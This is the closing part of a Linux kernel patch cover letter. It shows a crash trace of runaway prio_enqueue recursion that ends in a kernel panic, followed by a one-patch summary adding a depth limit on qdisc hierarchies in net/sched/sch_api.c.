[  192.467613][    C0]  ? __pfx_prio_enqueue+0x10/0x10
[  192.467619][    C0]  ? mprotect_fixup+0x27a/0xe30
[  192.467629][    C0]  prio_enqueue+0x209/0x7c0
[  192.467635][    C0]  ? __pfx_prio_enqueue+0x10/0x10
[  192.467642][    C0]  prio_enqueue+0x209/0x7c0
[  192.467648][    C0]  ? __pfx_prio_enqueue+0x10/0x10
[  192.467655][    C0]  prio_enqueue+0x209/0x7c0
[  192.467661][    C0]  ? __pfx_prio_enqueue+0x10/0x10
[  192.467668][    C0]  prio_enqueue+0x209/0x7c0
[  192.467675][    C0]  ? __pfx_prio_enqueue+0x10/0x10
[  192.467680][    C0]  ? __lock_acquire+0x49f/0x1a40
[  192.467688][    C0]  prio_enqueue+0x209/0x7c0
[  192.467695][    C0]  ? __pfx_prio_enqueue+0x10/0x10
[  192.467702][    C0]  prio_enqueue+0x209/0x7c0
[  192.467708][    C0]  ? __pfx_stack_trace_consume_entry+0x10/0x10
[  192.467715][    C0]  ? __pfx_prio_enqueue+0x10/0x10
[  192.467721][    C0]  ? kernel_text_address+0x8d/0x100
[  192.467738][    C0]  ? unwind_get_return_address+0x59/0xa0
[  192.467753][    C0]  prio_enqueue+0x209/0x7c0
[  192.467760][    C0]  ? __pfx_prio_enqueue+0x10/0x10
[  192.467767][    C0]  prio_enqueue+0x209/0x7c0
[  192.467774][    C0]  ? __pfx_prio_enqueue+0x10/0x10
[  192.467781][    C0]  prio_enqueue+0x209/0x7c0
[  192.467787][    C0]  ? __pfx_prio_enqueue+0x10/0x10
[  192.467795][    C0]  prio_enqueue+0x209/0x7c0
[  192.467801][    C0]  ? __pfx_prio_enqueue+0x10/0x10
[  192.467807][    C0]  ? __pfx_do_raw_spin_lock+0x10/0x10
[  192.467816][    C0]  __dev_queue_xmit+0x2ffa/0x4970
[  192.467840][    C0]  ? kmalloc_reserve+0x148/0x350
[  192.467855][    C0]  ? __pfx___dev_queue_xmit+0x10/0x10
[  192.467863][    C0]  ? lock_acquire+0x180/0x370
[  192.467870][    C0]  ? find_held_lock+0x2b/0x80
[  192.467875][    C0]  ? nf_hook.constprop.0+0x2f0/0x760
[  192.467884][    C0]  ? nf_hook.constprop.0+0x2f0/0x760
[  192.467894][    C0]  ? nf_hook.constprop.0+0x2fa/0x760
[  192.467902][    C0]  ? __pfx_arp_xmit_finish+0x10/0x10
[  192.467911][    C0]  ? __pfx_nf_hook.constprop.0+0x10/0x10
[  192.467920][    C0]  ? lock_acquire+0x1b9/0x370
[  192.467928][    C0]  arp_xmit+0x106/0x2e0
[  192.467937][    C0]  arp_send_dst+0x200/0x280
[  192.467945][    C0]  arp_solicit+0x672/0x1070
[  192.467951][    C0]  ? trace_kmem_cache_alloc+0xdd/0x100
[  192.467959][    C0]  ? __kasan_slab_alloc+0x89/0x90
[  192.467966][    C0]  ? __pfx_arp_solicit+0x10/0x10
[  192.467972][    C0]  ? neigh_probe+0x72/0x110
[  192.467988][    C0]  ? __pfx_arp_solicit+0x10/0x10
[  192.467993][    C0]  neigh_probe+0xce/0x110
[  192.468001][    C0]  __neigh_event_send+0xabe/0x13d0
[  192.468009][    C0]  neigh_resolve_output+0x550/0x8f0
[  192.468015][    C0]  ? __pfx____neigh_create+0x10/0x10
[  192.468022][    C0]  ip_finish_output2+0x851/0x2400
[  192.468032][    C0]  ? __pfx_ip_finish_output2+0x10/0x10
[  192.468039][    C0]  ? __pfx_ip_dst_mtu_maybe_forward+0x10/0x10
[  192.468048][    C0]  ? find_held_lock+0x2b/0x80
[  192.468053][    C0]  __ip_finish_output.part.0+0x444/0x6f0
[  192.468062][    C0]  ip_output+0x39b/0xc10
[  192.468070][    C0]  ? __pfx_ip_output+0x10/0x10
[  192.468077][    C0]  ? __ip_make_skb+0x111e/0x1f90
[  192.468086][    C0]  ? __pfx_ip_finish_output+0x10/0x10
[  192.468094][    C0]  ? __pfx_ip_output+0x10/0x10
[  192.468102][    C0]  ip_push_pending_frames+0x284/0x300
[  192.468111][    C0]  raw_sendmsg+0x1509/0x3590
[  192.468117][    C0]  ? __pfx_raw_sendmsg+0x10/0x10
[  192.468123][    C0]  ? avc_has_perm+0x135/0x1e0
[  192.468148][    C0]  ? __pfx_avc_has_perm+0x10/0x10
[  192.468157][    C0]  ? __pfx_tomoyo_check_inet_address+0x10/0x10
[  192.468177][    C0]  ? __pfx_raw_sendmsg+0x10/0x10
[  192.468183][    C0]  inet_sendmsg+0x11c/0x140
[  192.468192][    C0]  __sys_sendto+0x453/0x4e0
[  192.468214][    C0]  ? __pfx_inet_sendmsg+0x10/0x10
[  192.468223][    C0]  ? __pfx___sys_sendto+0x10/0x10
[  192.468231][    C0]  ? count_memcg_events_mm.constprop.0+0xfa/0x2a0
[  192.468241][    C0]  __x64_sys_sendto+0xe0/0x1c0
[  192.468249][    C0]  ? do_syscall_64+0x90/0x860
[  192.468257][    C0]  ? lockdep_hardirqs_on+0x78/0x100
[  192.468266][    C0]  do_syscall_64+0x10b/0x860
[  192.468275][    C0]  entry_SYSCALL_64_after_hwframe+0x77/0x7f
[  192.468281][    C0] RIP: 0033:0x7f69fe7cf046
[  192.468295][    C0] Code: 0e 0d 00 f7 d8 64 89 02 48 c7 c0 ff ff ff ff eb b8 0f 1f 00 41 89 ca 64 8b 04 25 18 00 00 00 85 c0 75 11 b8 2c 00 00 00 0f 05 <48> 3d 00 f0 ff ff 77 72 c3 90 55 48 83 ec 30 44 89 4c 24 2c 4c 89
[  192.468301][    C0] RSP: 002b:00007ffdb7ccbf98 EFLAGS: 00000246 ORIG_RAX: 000000000000002c
[  192.468307][    C0] RAX: ffffffffffffffda RBX: 00007ffdb7ccd720 RCX: 00007f69fe7cf046
[  192.468311][    C0] RDX: 0000000000000040 RSI: 000055becbf95950 RDI: 0000000000000003
[  192.468315][    C0] RBP: 000055becbf95950 R08: 00007ffdb7ccf99c R09: 0000000000000010
[  192.468319][    C0] R10: 0000000000000000 R11: 0000000000000246 R12: 0000000000000040
[  192.468322][    C0] R13: 00007ffdb7ccd6e0 R14: 00007ffdb7ccbfa0 R15: 0000001d00000001
[  192.468338][    C0]  </TASK>
[  192.468349][    C0] Modules linked in:
[  192.468370][    C0] ---[ end trace 0000000000000000 ]---
[  192.468381][    C0] RIP: 0010:prio_enqueue+0x2e/0x7c0
[  192.468388][    C0] Code: 55 48 89 e5 41 57 41 56 41 55 49 bd 00 00 00 00 00 fc ff df 41 54 49 89 fc 53 48 89 f3 48 83 e4 f0 48 83 c4 80 4c 8d 74 24 20 <48> 89 54 24 18 48 c7 44 24 20 b3 8a b5 41 49 c1 ee 03 48 c7 44 24
[  192.468394][    C0] RSP: 0018:ffffc9000dbd7fe0 EFLAGS: 00010283
[  192.468399][    C0] RAX: ffffffff89a12450 RBX: ffff88804c17cc00 RCX: ffffffff89a1298d
[  192.468410][    C0] RDX: ffffc9000dbdf380 RSI: ffff88804c17cc00 RDI: ffff88803c2ca580
[  192.468414][    C0] RBP: ffffc9000dbd8090 R08: 0000000000000005 R09: 000000000000ffff
[  192.468418][    C0] R10: 0000000000000000 R11: 0000000000000001 R12: ffff88803c2ca580
[  192.468422][    C0] R13: dffffc0000000000 R14: ffffc9000dbd8000 R15: ffff88804c179280
[  192.468426][    C0] FS:  00007f69fe54f000(0000) GS:ffff8880d62af000(0000) knlGS:0000000000000000
[  192.468437][    C0] CS:  0010 DS: 0000 ES: 0000 CR0: 0000000080050033
[  192.468442][    C0] CR2: ffffc9000dbd7fd8 CR3: 000000004b49e000 CR4: 0000000000352ef0
[  192.468455][    C0] Kernel panic - not syncing: Fatal exception in interrupt
[  192.469576][    C0] Kernel Offset: disabled

-----END crash log-----

Best regards,
Zijie Huang


Zijie Huang (1):
  net/sched: reject overly deep qdisc hierarchies

 net/sched/sch_api.c | 24 ++++++++++++++++++++++++
 1 file changed, 24 insertions(+)

-- 
2.47.2
